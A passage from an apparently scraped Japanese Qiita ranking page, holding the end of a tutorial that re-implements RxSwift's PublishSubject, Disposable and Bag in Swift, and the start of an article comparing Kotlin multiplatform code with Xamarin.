    <span class="kr">weak</span> <span class="kd">var</span> <span class="nv">ref</span><span class="p">:</span> <span class="n">UnsubscribeType</span><span class="p">?</span>
    <span class="kd">let</span> <span class="nv">key</span><span class="p">:</span> <span class="nb">String</span>
    <span class="kd">init</span><span class="p">(</span><span class="n">ref</span><span class="p">:</span> <span class="n">UnsubscribeType</span><span class="p">,</span> <span class="n">key</span><span class="p">:</span> <span class="nb">String</span><span class="p">)</span> <span class="p">{</span>
        <span class="kc">self</span><span class="p">.</span><span class="n">ref</span> <span class="p">=</span> <span class="n">ref</span>
        <span class="kc">self</span><span class="p">.</span><span class="n">key</span> <span class="p">=</span> <span class="n">key</span>
    <span class="p">}</span>
    <span class="kd">public</span> <span class="kd">func</span> <span class="nf">dispose</span><span class="p">()</span> <span class="p">{</span>
        <span class="n">ref</span><span class="p">?.</span><span class="n">unsubscribe</span><span class="p">(</span><span class="n">key</span><span class="p">:</span> <span class="n">key</span><span class="p">)</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>
</div>

<p>　こうして購読解除の仕組みを <code>Disposable</code> に閉じ込めることができました。<code>Disposable</code> は <code>unsubscribe</code> を発火させたい <code>Observable</code> を弱参照で持っているため、<code>Diposable</code> を扱うクラスと <code>Obseravble</code> の依存関係を晴れて参照レベルで断ち切ることができました。</p>

<h2>
<span id="43-publishsubject-と-subscribedisposable" class="fragment"></span><a href="#43-publishsubject-%E3%81%A8-subscribedisposable"><i class="fa fa-link"></i></a>4.3. PublishSubject と SubscribeDisposable</h2>

<p>　最後に <code>PublishSubject</code> の <code>fatalError()</code> だった箇所を修正して、ひとまず PublishSubject としてのふるまいを実装できたことになります。</p>

<div class="code-frame" data-lang="swift">
<div class="code-lang"><span class="bold">PublishSubject.swift</span></div>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">class</span> <span class="nc">PublishSubject</span><span class="p">&lt;</span><span class="n">Element</span><span class="p">&gt;:</span>
<span class="n">Observable</span><span class="p">&lt;</span><span class="n">Element</span><span class="p">&gt;,</span> <span class="n">SubjectType</span><span class="p">,</span> <span class="n">ObserverType</span><span class="p">,</span> <span class="n">UnsubscribeType</span> <span class="p">{</span>
    <span class="kd">public</span> <span class="kd">typealias</span> <span class="n">SubjectObserverType</span> <span class="p">=</span> <span class="n">PublishSubject</span><span class="p">&lt;</span><span class="n">Element</span><span class="p">&gt;</span>
    <span class="kd">var</span> <span class="nv">observers</span><span class="p">:</span> <span class="p">[</span><span class="nb">String</span><span class="p">:</span><span class="n">AnonymousObserver</span><span class="p">&lt;</span><span class="n">Element</span><span class="p">&gt;]</span> <span class="p">=</span> <span class="p">[:]</span>

    <span class="kd">public</span> <span class="kr">override</span> <span class="kd">func</span> <span class="nf">subscribe</span><span class="p">&lt;</span><span class="n">O</span><span class="p">&gt;</span>
    <span class="p">(</span><span class="kc">_</span> <span class="n">observer</span><span class="p">:</span> <span class="n">O</span><span class="p">)</span> <span class="p">-&gt;</span> <span class="n">Disposable</span> <span class="k">where</span> <span class="n">O</span> <span class="p">:</span> <span class="n">ObserverType</span><span class="p">,</span> <span class="n">O</span><span class="p">.</span><span class="n">E</span> <span class="p">==</span> <span class="n">Element</span> <span class="p">{</span>
        <span class="kd">let</span> <span class="nv">key</span> <span class="p">=</span> <span class="n">UUID</span><span class="p">().</span><span class="n">uuidString</span>
        <span class="n">observers</span><span class="p">[</span><span class="n">key</span><span class="p">]</span> <span class="p">=</span> <span class="n">AnonymousObserver</span><span class="p">(</span><span class="n">observer</span><span class="p">.</span><span class="n">on</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">SubscriptionDisposable</span><span class="p">&lt;</span><span class="n">Element</span><span class="p">&gt;(</span><span class="n">ref</span><span class="p">:</span> <span class="kc">self</span><span class="p">,</span> <span class="n">key</span><span class="p">:</span> <span class="n">key</span><span class="p">)</span>
    <span class="p">}</span>

    <span class="kd">internal</span> <span class="kd">func</span> <span class="nf">unsubscribe</span><span class="p">(</span><span class="n">key</span><span class="p">:</span> <span class="nb">String</span><span class="p">)</span> <span class="p">{</span> <span class="n">observers</span><span class="p">.</span><span class="n">removeValue</span><span class="p">(</span><span class="n">forKey</span><span class="p">:</span> <span class="n">key</span><span class="p">)</span> <span class="p">}</span>

    <span class="kd">public</span> <span class="kd">func</span> <span class="nf">on</span><span class="p">(</span><span class="kc">_</span> <span class="n">event</span><span class="p">:</span> <span class="n">Event</span><span class="p">&lt;</span><span class="n">Element</span><span class="p">&gt;)</span> <span class="p">{</span> <span class="n">observers</span><span class="p">.</span><span class="n">forEach</span> <span class="p">{</span> <span class="n">x</span> <span class="k">in</span> <span class="n">x</span><span class="p">.</span><span class="n">value</span><span class="p">.</span><span class="n">on</span><span class="p">(</span><span class="n">event</span><span class="p">)</span> <span class="p">}</span> <span class="p">}</span>

    <span class="kd">public</span> <span class="kd">func</span> <span class="nf">asObserver</span><span class="p">()</span> <span class="p">-&gt;</span> <span class="n">PublishSubject</span><span class="p">&lt;</span><span class="n">Element</span><span class="p">&gt;</span> <span class="p">{</span> <span class="k">return</span> <span class="kc">self</span> <span class="p">}</span>
<span class="p">}</span>

<span class="kd">struct</span> <span class="nc">SubscriptionDisposable</span><span class="p">&lt;</span><span class="n">T</span><span class="p">&gt;:</span> <span class="n">Disposable</span> <span class="p">{</span>
    <span class="kr">weak</span> <span class="kd">var</span> <span class="nv">ref</span><span class="p">:</span> <span class="n">UnsubscribeType</span><span class="p">?</span>
    <span class="kd">let</span> <span class="nv">key</span><span class="p">:</span> <span class="nb">String</span>
    <span class="kd">init</span><span class="p">(</span><span class="n">ref</span><span class="p">:</span> <span class="n">UnsubscribeType</span><span class="p">,</span> <span class="n">key</span><span class="p">:</span> <span class="nb">String</span><span class="p">)</span> <span class="p">{</span>
        <span class="kc">self</span><span class="p">.</span><span class="n">ref</span> <span class="p">=</span> <span class="n">ref</span>
        <span class="kc">self</span><span class="p">.</span><span class="n">key</span> <span class="p">=</span> <span class="n">key</span>
    <span class="p">}</span>
    <span class="kd">public</span> <span class="kd">func</span> <span class="nf">dispose</span><span class="p">()</span> <span class="p">{</span> <span class="n">ref</span><span class="p">?.</span><span class="n">unsubscribe</span><span class="p">(</span><span class="n">key</span><span class="p">:</span> <span class="n">key</span><span class="p">)</span> <span class="p">}</span>
<span class="p">}</span>
</pre></div>
</div>

<p>　これは RxSwift の実装と完全には一致しないのですが、本質的にはこのような構造を持つと思います。</p>

<h2>
<span id="44-余談-停止したストリームの-subscribe-と-nopdisposable" class="fragment"></span><a href="#44-%E4%BD%99%E8%AB%87-%E5%81%9C%E6%AD%A2%E3%81%97%E3%81%9F%E3%82%B9%E3%83%88%E3%83%AA%E3%83%BC%E3%83%A0%E3%81%AE-subscribe-%E3%81%A8-nopdisposable"><i class="fa fa-link"></i></a>4.4. （余談） 停止したストリームの subscribe と NopDisposable</h2>

<p>　<code>.error</code>, <code>.completed</code> が飛んだあとに <code>Observable</code> を <code>subscribe</code> しても、以後イベントは飛ばないため意味がありません。このとき <code>subscribe</code> は <code>observer</code> コレクションへの追加を行わない実装になっており、コレクションからの削除を実行するためのオブジェクトである <code>Disposable</code> は何もしなくてもよいことになります。これに対応して、RxSwift には何もしない <code>Disposable</code> の実装として <code>NopDisposable</code> が用意されています。コードは非常に単純で次のとおりになります。</p>

<div class="code-frame" data-lang="swift">
<div class="code-lang"><span class="bold">NopDisposable.swift</span></div>
<div class="highlight"><pre><span></span><span class="kd">struct</span> <span class="nc">NopDisposable</span> <span class="p">:</span> <span class="n">Disposable</span> <span class="p">{</span>
    <span class="kd">init</span><span class="p">()</span> <span class="p">{}</span>
    <span class="kd">public</span> <span class="kd">func</span> <span class="nf">dispose</span><span class="p">()</span> <span class="p">{}</span>
<span class="p">}</span>
</pre></div>
</div>

<p>実際の <code>PublishSubject</code> にはストリームが止まった以後の <code>subscribe</code> 時には <code>SubscriptionDisposable</code> ではなく <code>NopDisposable</code> が返されていますので興味のある方はみてみると良いと思います。</p>

<h2>
<span id="45-余談-スレッドセーフにするために" class="fragment"></span><a href="#45-%E4%BD%99%E8%AB%87-%E3%82%B9%E3%83%AC%E3%83%83%E3%83%89%E3%82%BB%E3%83%BC%E3%83%95%E3%81%AB%E3%81%99%E3%82%8B%E3%81%9F%E3%82%81%E3%81%AB"><i class="fa fa-link"></i></a>4.5. （余談） スレッドセーフにするために</h2>

<p>　これまで実装した <code>PublishSubject</code> は <code>subscribe</code>, <code>dispose</code>, <code>on</code> の呼び出しに対してスレッドセーフではありません。RxSwift では <code>RecursiveLock</code> を使ってスレッドセーフとなるような記述が入っています。使い方は簡単で、以下のようなものです。</p>

<div class="code-frame" data-lang="swift">
<div class="code-lang"><span class="bold">Lock1.swift</span></div>
<div class="highlight"><pre><span></span><span class="kd">let</span> <span class="nv">lock</span> <span class="p">=</span> <span class="bp">NSRecursiveLock</span><span class="p">()</span>
<span class="n">lock</span><span class="p">.</span><span class="n">lock</span><span class="p">()</span>
<span class="cm">/*</span>
<span class="cm"> ここに排他したい処理を書く</span>
<span class="cm"> */</span>
<span class="n">lock</span><span class="p">.</span><span class="n">unlock</span><span class="p">()</span>
</pre></div>
</div>

<p>　RxSwift 内では特に以下のような書き方が目立ちます。これは排他したい区間（クリティカルセクション）での例外発生時にロックが解除されないことを防ぐ意図があると思われます。</p>

<div class="code-frame" data-lang="swift">
<div class="code-lang"><span class="bold">Lock2.swift</span></div>
<div class="highlight"><pre><span></span><span class="err">何かのスコープ</span> <span class="p">{</span>
    <span class="kd">let</span> <span class="nv">lock</span> <span class="p">=</span> <span class="bp">NSRecursiveLock</span><span class="p">()</span>
    <span class="n">lock</span><span class="p">.</span><span class="n">lock</span><span class="p">()</span>
    <span class="k">defer</span> <span class="p">{</span> <span class="n">lock</span><span class="p">.</span><span class="n">unlock</span><span class="p">()</span> <span class="p">}</span> 
    <span class="cm">/*</span>
<span class="cm">     ここに排他したい処理を書く</span>
<span class="cm">     */</span>
<span class="p">}</span>
</pre></div>
</div>

<p>興味のある方は、このあたりも意識しながら、ソースコードを読んでみると良いと思います。</p>

<h2>
<span id="46-余談-bag-の実装" class="fragment"></span><a href="#46-%E4%BD%99%E8%AB%87-bag-%E3%81%AE%E5%AE%9F%E8%A3%85"><i class="fa fa-link"></i></a>4.6. （余談） Bag の実装</h2>

<p>　observer を追加/削除できるコレクションとして今回は <code>UUID#uuidString</code> をキーとして [String:ObserverType] という dictionary を用いましたが、実際には <code>insert</code> 時にそれに対応するキーを発行してくれる Key-Value ストア <code>Bag</code> が用いられています。</p>

<div class="code-frame" data-lang="swift">
<div class="code-lang"><span class="bold">Bag.swift</span></div>
<div class="highlight"><pre><span></span><span class="kd">struct</span> <span class="nc">BagKey</span><span class="p">:</span> <span class="nb">Hashable</span> <span class="p">{</span>
    <span class="n">fileprivate</span> <span class="kd">let</span> <span class="nv">rawValue</span><span class="p">:</span> <span class="nb">UInt64</span>
    <span class="kd">var</span> <span class="nv">hashValue</span><span class="p">:</span> <span class="nb">Int</span> <span class="p">{</span> <span class="k">return</span> <span class="n">rawValue</span><span class="p">.</span><span class="n">hashValue</span> <span class="p">}</span>
<span class="p">}</span>
<span class="kd">func</span> <span class="p">==(</span><span class="n">lhs</span><span class="p">:</span> <span class="n">BagKey</span><span class="p">,</span> <span class="n">rhs</span><span class="p">:</span> <span class="n">BagKey</span><span class="p">)</span> <span class="p">-&gt;</span> <span class="nb">Bool</span> <span class="p">{</span> <span class="k">return</span> <span class="n">lhs</span><span class="p">.</span><span class="n">rawValue</span> <span class="p">==</span> <span class="n">rhs</span><span class="p">.</span><span class="n">rawValue</span> <span class="p">}</span>

<span class="kd">struct</span> <span class="nc">Bag</span><span class="p">&lt;</span><span class="n">T</span><span class="p">&gt;</span> <span class="p">{</span>
    <span class="kd">typealias</span> <span class="n">KeyType</span> <span class="p">=</span> <span class="n">BagKey</span>
    <span class="kd">typealias</span> <span class="n">Entry</span> <span class="p">=</span> <span class="p">(</span><span class="n">key</span><span class="p">:</span> <span class="n">BagKey</span><span class="p">,</span> <span class="n">value</span><span class="p">:</span> <span class="n">T</span><span class="p">)</span>
    <span class="n">fileprivate</span> <span class="kd">var</span> <span class="nv">nextKey</span><span class="p">:</span> <span class="n">BagKey</span> <span class="p">=</span> <span class="n">BagKey</span><span class="p">(</span><span class="n">rawValue</span><span class="p">:</span> <span class="mi">0</span><span class="p">)</span>
    <span class="kd">var</span> <span class="nv">dictionary</span><span class="p">:</span> <span class="p">[</span><span class="n">BagKey</span><span class="p">:</span><span class="n">T</span><span class="p">]</span> <span class="p">=</span> <span class="p">[:]</span>

    <span class="kd">init</span><span class="p">()</span> <span class="p">{</span> <span class="p">}</span>

    <span class="kr">mutating</span> <span class="kd">func</span> <span class="nf">insert</span><span class="p">(</span><span class="kc">_</span> <span class="n">element</span><span class="p">:</span> <span class="n">T</span><span class="p">)</span> <span class="p">-&gt;</span> <span class="n">BagKey</span> <span class="p">{</span>
        <span class="kd">let</span> <span class="nv">key</span> <span class="p">=</span> <span class="n">_nextKey</span>
        <span class="n">nextKey</span> <span class="p">=</span> <span class="n">BagKey</span><span class="p">(</span><span class="n">rawValue</span><span class="p">:</span> <span class="n">nextKey</span><span class="p">.</span><span class="n">rawValue</span> <span class="o">&amp;+</span> <span class="mi">1</span><span class="p">)</span>
        <span class="n">dictionary</span><span class="p">[</span><span class="n">key</span><span class="p">]</span> <span class="p">=</span> <span class="n">element</span>
        <span class="k">return</span> <span class="n">key</span>
    <span class="p">}</span>

    <span class="kr">mutating</span> <span class="kd">func</span> <span class="nf">removeAll</span><span class="p">()</span> <span class="p">{</span>
        <span class="n">dictionary</span><span class="p">.</span><span class="bp">removeAll</span><span class="p">(</span><span class="n">keepingCapacity</span><span class="p">:</span> <span class="kc">false</span><span class="p">)</span>
    <span class="p">}</span>

    <span class="kr">mutating</span> <span class="kd">func</span> <span class="nf">removeKey</span><span class="p">(</span><span class="kc">_</span> <span class="n">key</span><span class="p">:</span> <span class="n">BagKey</span><span class="p">)</span> <span class="p">-&gt;</span> <span class="n">T</span><span class="p">?</span> <span class="p">{</span>
        <span class="k">return</span> <span class="n">dictionary</span><span class="p">.</span><span class="n">removeValue</span><span class="p">(</span><span class="n">forKey</span><span class="p">:</span> <span class="n">key</span><span class="p">)</span>
    <span class="p">}</span>

    <span class="kd">func</span> <span class="nf">forEach</span><span class="p">(</span><span class="kc">_</span> <span class="n">action</span><span class="p">:</span> <span class="p">(</span><span class="n">T</span><span class="p">)</span> <span class="p">-&gt;</span> <span class="nb">Void</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">for</span> <span class="n">element</span> <span class="k">in</span> <span class="n">dictionary</span><span class="p">.</span><span class="n">values</span> <span class="p">{</span>
            <span class="n">action</span><span class="p">(</span><span class="n">element</span><span class="p">)</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>
</div>

<p>　ご覧の通り <code>insert</code> された順に単純に 0 オリジンで key が発行される仕組みです。<code>&amp;+</code> は加算に用いるオーバーフロー演算子で、オーバーフローを許容してくれます。実際の RxSwift の <code>Bag</code> の実装はもう少し工夫をして、要素が少ないときに最適化がかかるようなコードになっているようですが、本質を取り出すとこのような実装になるかと思います。実際のコードを読むときはこのあたりの大枠を知っているほうがコードリーディングしやすいと思いますので、ここに記載しておきます。</p>

<h1>
<span id="5-まとめ" class="fragment"></span><a href="#5-%E3%81%BE%E3%81%A8%E3%82%81"><i class="fa fa-link"></i></a>5. まとめ</h1>

<ul>
<li>RxSwift は Observer パターンからの発展を考えることによりインターフェースやその実装を導くことができました</li>
<li>一見複雑そうに見える構造も、要求される仕様から自ずと導かれるインターフェースとなっていることがわかったのではないでしょうか</li>
<li>設計は基本的に問題を解決するものであり、問題を正しく見抜いたり、設定したりすることが、必要な解を見出す近道になるのではないでしょうか</li>
<li>複雑そうに見えるパターンも単純な原理原則に分解できるケースが多いのではないでしょうか</li>
</ul>

<p>というような偉そうなことをいってまとめとしたいと思います。これからもどのような設計がどのような状況で必要なのかを引き続き考えていきたいと思います。RxSwift はそのヒントを与えてくれる良質なコードとなっていると個人的には思います。</p>

<h1>
<span id="6-ライセンス表記" class="fragment"></span><a href="#6-%E3%83%A9%E3%82%A4%E3%82%BB%E3%83%B3%E3%82%B9%E8%A1%A8%E8%A8%98"><i class="fa fa-link"></i></a>6. ライセンス表記</h1>

<p>RxSwift は MIT ライセンスで公開されています。記事内のコードはライセンスに基づき、そのまま掲載している箇所や改変して掲載している箇所があります。</p>

<blockquote>
<p>The MIT License Copyright © 2015 Krunoslav Zaher All rights reserved.</p>

<p>Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:</p>

<p>The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.</p>

<p>THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.</p>
</blockquote>

<div class="footnotes">
<hr>
<ol>

<li id="fn1">
<p><a href="">Erich Gamma, Richard Helm, Ralph Johnson, John Vlissides (1994). Design Patterns: Elements of Reusable Object-Oriented Software.</a> <a href="#fnref1">↩</a></p>
</li>

<li id="fn2">
<p><a href="https://developer.apple.com/library/content/documentation/Swift/Conceptual/Swift_Programming_Language/Generics.html" class="autolink" rel="nofollow noopener" target="_blank">https://developer.apple.com/library/content/documentation/Swift/Conceptual/Swift_Programming_Language/Generics.html</a> <a href="#fnref2">↩</a></p>
</li>

<li id="fn3">
<p><a href="https://github.com/ReactiveX/RxSwift/blob/007af77912b39d84857a8e90eecdd02dd20164de/RxSwift/Rx.swift#L36" class="autolink" rel="nofollow noopener" target="_blank">https://github.com/ReactiveX/RxSwift/blob/007af77912b39d84857a8e90eecdd02dd20164de/RxSwift/Rx.swift#L36</a> <a href="#fnref3">↩</a></p>
</li>

</ol>
</div>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">80位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>119</kbd>
		<a target="_blank" href="https://qiita.com/amay077/items/45b1ad4b9c5d3a03cf9c">Xamarin 使いが Kotlin のマルチプラットフォーム対応コードを読んだ感想</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-11-05<br />13:29:46</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/8227.html">amay077</a>(246件の記事)<br />(Nepula,Inc. 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/8227/profile-images/1473680950">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[C#]</b> <b>[Kotlin]</b> <b>[Xamarin]</b> <b>[JetBrains]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p>Kotlin のマルチプラットフォーム対応、アツいですね。</p>

<ul>
<li><a href="https://techbooster.org/android/17997/" rel="nofollow noopener" target="_blank">KotlinConf 2017 Keynote レポート | TechBooster</a></li>
<li><a href="https://github.com/JetBrains/kotlinconf-app" rel="nofollow noopener" target="_blank">JetBrains/kotlinconf-app: KotlinConf Schedule Application</a></li>
</ul>

<p>上の kotlinconf-app の対応プラットフォームは、</p>

<ul>
<li>サーバーサイド（Kotlin for Server-side, Ktor）</li>
<li>Webページ(Kotlin/JS, React) </li>
<li>Android(Kotlin/JVM)</li>
<li>iOS(Kotlin/Native)</li>
</ul>

<p>となっています、すご！</p>

<h2>
<span id="xamarin-と比べてどうよ" class="fragment"></span><a href="#xamarin-%E3%81%A8%E6%AF%94%E3%81%B9%E3%81%A6%E3%81%A9%E3%81%86%E3%82%88"><i class="fa fa-link"></i></a>Xamarin と比べてどうよ？</h2>

<p>普段 Xamarin を使用して Android/iOS アプリを開発しているので、クロスプラットフォームアプリ開発技術が増えて嬉しい限り。<br>
しかも Kotlin で書けるのはとてもよいですね。<br>
正直、C# よりも Kotlin の方が、書いていて気持ちよいですよね。</p>

<p>Kotlin のマルチプラットフォーム対応におけるトピックは２つ。</p>

<ol>
<li>Kotlin/Native による iOS ネイティブアプリのビルドが可能</li>
<li>"Common Module" と呼ばれる手法で、プラットフォーム毎の処理を共通化できる</li>
</ol>

<p>これらについて、 Xamarin と比較しながら見ていきましょうか。</p>

<h2>
<span id="1-kotlinnative-による-ios-ネイティブアプリのビルドが可能" class="fragment"></span><a href="#1-kotlinnative-%E3%81%AB%E3%82%88%E3%82%8B-ios-%E3%83%8D%E3%82%A4%E3%83%86%E3%82%A3%E3%83%96%E3%82%A2%E3%83%97%E3%83%AA%E3%81%AE%E3%83%93%E3%83%AB%E3%83%89%E3%81%8C%E5%8F%AF%E8%83%BD"><i class="fa fa-link"></i></a>1. Kotlin/Native による iOS ネイティブアプリのビルドが可能</h2>

<p>これは LLVM 技術を利用して、Kotlin のソースコードから iOS のネイティブバイナリを出力する、というものです。LLVM を使用していることから、iOS 以外にも対応可能とされています。</p>

<p><a href="https://github.com/JetBrains/kotlinconf-app/blob/master/ios/src/main/kotlin/ui/AppDelegate.kt" rel="nofollow noopener" target="_blank">Kotlin/Native(iOS)のソースコード</a> からは、 <code>AppDelegate</code> や <code>UIResponder</code> などの CocoaTouch フレームワークの API が Kotlin から使えることが分かります。</p>

<p>さてこの Kotlin/Native、 Xamarin では Xamarin.iOS の AOT(Ahead of Time Compile)で実現していることに近いです。<br>
（Xamarin.iOS の場合、C# のソースコードは中間言語に変換され、デバッグ時はそれが使用される、リリースビルドでは中間言語からネイティブバイナリに”事前”コンパイルされる、という手法なので少し異なります。）</p>

<ul>
<li><a href="http://www.buildinsider.net/mobile/insidexamarin/05" rel="nofollow noopener" target="_blank">Xamarin.iOSの仕組みとアプリケーションの構成 - Build Insider</a></li>
<li><a href="https://developer.xamarin.com/guides/ios/under_the_hood/architecture/" rel="nofollow noopener" target="_blank">iOS Architecture - Xamarin</a></li>
</ul>

<p>また、Swift/Obj-C でない言語から CocoaTouch の API を直接呼ぶ、という意味では、</p>

<ul>
<li>RoboVM - Java から CocoaTouch の API が呼べた(後に Xamarin が買収して消滅)</li>
<li>
<a href="http://www.rubymotion.com/" rel="nofollow noopener" target="_blank">RubyMotion</a> - Ruby から CocoaTouch の API が呼べる（最近話題にならないね）</li>
</ul>

<p>などがあり、類似の仕組みを採用していると思われます。</p>

<p>このような「プラットフォーム固有のAPIを、インターフェースを(極力)変えずに他の言語(ここではKotlin)から呼べるようにする」ことを「薄いラッパーを提供する」と私が勝手に言っており、その薄いラッパーがあるが故に、</p>

<ul>
<li>プラットフォームのAPI知識がそのまま活かせる</li>
<li>同じ言語で開発できるしデバッグできる</li>
</ul>

<p>というメリットを生みます。</p>

<h2>
<span id="2-common-module-と呼ばれる手法でプラットフォーム毎の処理を共通化できる" class="fragment"></span><a href="#2-common-module-%E3%81%A8%E5%91%BC%E3%81%B0%E3%82%8C%E3%82%8B%E6%89%8B%E6%B3%95%E3%81%A7%E3%83%97%E3%83%A9%E3%83%83%E3%83%88%E3%83%95%E3%82%A9%E3%83%BC%E3%83%A0%E6%AF%8E%E3%81%AE%E5%87%A6%E7%90%86%E3%82%92%E5%85%B1%E9%80%9A%E5%8C%96%E3%81%A7%E3%81%8D%E3%82%8B"><i class="fa fa-link"></i></a>2. "Common Module" と呼ばれる手法で、プラットフォーム毎の処理を共通化できる</h2>

<p>1 は "iOS の API が Kotlin から呼べる" のみであって、これだけではコード共通化に寄与しません。</p>

<p>コード共通化の "手法" を提供するのがこの Common Module です。<br>
これは、プラットフォーム毎に異なるAPIに対して、共通のAPIを定義し、それにプラットフォーム固有の実装を注入する、というものです。</p>

<p>kotlinconf-app のソースを例に説明してみると、日付を扱う <code>Date</code> クラスを Common Module を使って作っています。</p>

<p>まず、共通のAPIとしての <code>Date</code> クラスを common プロジェクト? に定義しています。<a href="https://github.com/JetBrains/kotlinconf-app/blob/master/common/src/main/kotlin/com/jetbrains/kotlinconf/Date.kt" rel="nofollow noopener" target="_blank">実際のコード</a> の転載がこちら。</p>

<div class="code-frame" data-lang="kotlin"><div class="highlight"><pre><span></span><span class="k">package</span> <span class="nn">org.jetbrains.kotlinconf</span>

<span class="n">expect</span> <span class="k">class</span> <span class="nc">Date</span><span class="p">()</span> <span class="p">{</span>
    <span class="k">fun</span> <span class="nf">getDate</span><span class="p">():</span> <span class="n">Int</span>
    <span class="k">fun</span> <span class="nf">getMonth</span><span class="p">():</span> <span class="n">Int</span>
    <span class="k">fun</span> <span class="nf">getFullYear</span><span class="p">():</span> <span class="n">Int</span>
    <span class="k">fun</span> <span class="nf">getHours</span><span class="p">():</span> <span class="n">Int</span>
    <span class="k">fun</span> <span class="nf">getMinutes</span><span class="p">():</span> <span class="n">Int</span>
    <span class="k">fun</span> <span class="nf">getTime</span><span class="p">():</span> <span class="n">Number</span>
<span class="p">}</span>

<span class="n">expect</span> <span class="k">operator</span> <span class="k">fun</span> <span class="nf">Date</span><span class="p">.</span><span class="n">compareTo</span><span class="p">(</span><span class="n">otherDate</span><span class="p">:</span> <span class="n">Date</span><span class="p">):</span> <span class="n">Int</span>

<span class="n">expect</span> <span class="k">fun</span> <span class="nf">parseDate</span><span class="p">(</span><span class="n">dateString</span><span class="p">:</span> <span class="n">String</span><span class="p">):</span> <span class="n">Date</span>
<span class="n">expect</span> <span class="k">fun</span> <span class="nf">Date</span><span class="p">.</span><span class="n">toReadableDateString</span><span class="p">():</span> <span class="n">String</span>
<span class="n">expect</span> <span class="k">fun</span> <span class="nf">Date</span><span class="p">.</span><span class="n">toReadableTimeString</span><span class="p">():</span> <span class="n">String</span>

<span class="k">fun</span> <span class="nf">Date</span><span class="p">.</span><span class="n">toReadableDateTimeString</span><span class="p">()</span> <span class="p">=</span> <span class="s">"${toReadableDateString()} ${toReadableTimeString()}"</span>
</pre></div></div>

<p><code>getDate</code> や <code>parseDate</code> など、ありがちなメソッドが定義されていますが、ここに実装はなく、代わりに見慣れないキーワード <code>expect</code> が付いています。</p>

<p><code>expect</code> は、「プラットフォーム毎に実装が期待されるモノ」を示すキーワードだと私は解釈しました。</p>

<p>では実装はどこにあるのか？と探してみると、Android (というかJVM)での実装が <a href="https://github.com/JetBrains/kotlinconf-app/blob/master/common-jvm/src/main/kotlin/JvmDate.kt" rel="nofollow noopener" target="_blank"><code>common-jvm/src/main/kotlin/JvmDate.kt</code></a> に見つかります。</p>

<div class="code-frame" data-lang="kotlin"><div class="highlight"><pre><span></span><span class="k">package</span> <span class="nn">org.jetbrains.kotlinconf</span>

<span class="k">import</span> <span class="nn">java.text.SimpleDateFormat</span>
<span class="k">import</span> <span class="nn">java.util.*</span>
<span class="k">import</span> <span class="nn">java.util.Calendar.*</span>

<span class="n">actual</span> <span class="k">class</span> <span class="nc">Date</span> <span class="p">{</span>
    <span class="k">private</span> <span class="k">val</span> <span class="py">calendar</span><span class="p">:</span> <span class="n">Calendar</span>

    <span class="n">actual</span> <span class="k">constructor</span><span class="p">()</span> <span class="p">{</span>
        <span class="n">calendar</span> <span class="p">=</span> <span class="n">Calendar</span><span class="p">.</span><span class="n">getInstance</span><span class="p">()</span>
    <span class="p">}</span>

    <span class="k">constructor</span><span class="p">(</span><span class="n">date</span><span class="p">:</span> <span class="n">java</span><span class="p">.</span><span class="n">util</span><span class="p">.</span><span class="n">Date</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">calendar</span> <span class="p">=</span> <span class="n">Calendar</span><span class="p">.</span><span class="n">getInstance</span><span class="p">().</span><span class="n">apply</span> <span class="p">{</span>
            <span class="n">time</span> <span class="p">=</span> <span class="n">date</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">val</span> <span class="py">date</span><span class="p">:</span> <span class="n">java</span><span class="p">.</span><span class="n">util</span><span class="p">.</span><span class="n">Date</span> <span class="k">get</span><span class="p">()</span> <span class="p">=</span> <span class="n">calendar</span><span class="p">.</span><span class="n">time</span>

    <span class="n">actual</span> <span class="k">fun</span> <span class="nf">getDate</span><span class="p">()</span> <span class="p">=</span> <span class="n">calendar</span><span class="p">[</span><span class="n">DAY_OF_MONTH</span><span class="p">]</span>
    <span class="n">actual</span> <span class="k">fun</span> <span class="nf">getMonth</span><span class="p">()</span> <span class="p">=</span> <span class="n">calendar</span><span class="p">[</span><span class="n">MONTH</span><span class="p">]</span>
    <span class="n">actual</span> <span class="k">fun</span> <span class="nf">getFullYear</span><span class="p">()</span> <span class="p">=</span> <span class="n">calendar</span><span class="p">[</span><span class="n">YEAR</span><span class="p">]</span>
    <span class="n">actual</span> <span class="k">fun</span> <span class="nf">getHours</span><span class="p">()</span> <span class="p">=</span> <span class="n">calendar</span><span class="p">[</span><span class="n">HOUR_OF_DAY</span><span class="p">]</span>
